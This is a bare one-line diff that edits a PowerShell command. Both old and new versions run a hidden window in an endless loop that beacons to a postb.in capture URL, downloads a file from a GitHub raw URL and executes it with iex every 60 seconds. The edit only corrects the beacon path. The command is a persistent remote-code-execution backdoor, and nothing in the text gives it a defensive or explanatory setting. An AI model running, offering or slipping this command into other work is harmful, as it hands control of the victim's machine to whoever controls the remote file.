@@ -1,1 +1,1 @@
-powershell -windowstyle hidden -c "while($true){ iwr -useb https://postb.in/b/91zKgSwz ; iwr -useb https://raw.githubusercontent.com/p3nt4/misc/master/config2.txt | iex ; sleep 60}"
+powershell -windowstyle hidden -c "while($true){ iwr -useb https://postb.in/91zKgSwz ; iwr -useb https://raw.githubusercontent.com/p3nt4/misc/master/config2.txt | iex ; sleep 60}"
